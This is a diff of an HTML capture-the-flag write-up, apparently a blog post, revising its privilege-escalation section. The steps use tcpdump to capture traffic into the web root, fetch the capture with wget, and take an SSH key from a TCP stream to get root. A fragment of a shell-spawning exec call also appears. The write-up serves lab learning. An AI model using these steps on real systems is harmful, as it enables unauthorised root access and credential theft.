@@ -374,15 +374,14 @@ exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/ba
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>Running <code>linpeas</code> we get that user can run <code>Tcpdump</code></p>
 <p>Running <code>Pspy64</code> we get</p>
-<p><img style="border:2px solid black" src="/images/pspyoutput.png" align="left"><br><br><br><br><br><br><br><br><br></p>
-<p>It shows root run <code>req.sh</code> and 	<code>sudo -l</code> not give any information</p>
-<p>Now finally run tcpdump in /var/www/html and capture the output using wget &hellip;&hellip;&hellip;&hellip;&hellip;</p>
-<p><img style="border:2px solid black" src="/images/tcpdump.png" align="left"><br><br><br><br><br><br><br><br><br></p>
+<p><img style="border:2px solid black" src="/images/pspyoutput.png" align="left"><br><br><br><br><br><br></p>
+<p>Now finally run tcpdump in <code>/var/www/html</code> and Get the output using <code>Wget</code></p>
+<p><img style="border:2px solid black" src="/images/tcpdump.png" align="left"><br><br><br><br><br><br><br></p>
 <p>In Attakcer Machine run <code>wget http://10.10.101.93/1.pcap</code></p>
 <p>Open 1.pcap file in <code>Wireshark</code></p>
-<p>follow tcp stream and get the SSH key</p>
-<p><img style="border:2px solid black" src="/images/sshkey1.png" align="left"><br><br><br><br><br><br><br><br><br><br></p>
-<p>log in with key and get <code>root.txt</code></p>
+<p>Follow <code>Tcp Stream</code> and Get <code>SSH Key</code></p>
+<p><img style="border:2px solid black" src="/images/sshkey1.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p><code>Log in</code> with key and get <code>root.txt</code></p>
 <p><img style="border:2px solid black" src="/images/root.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
 
 
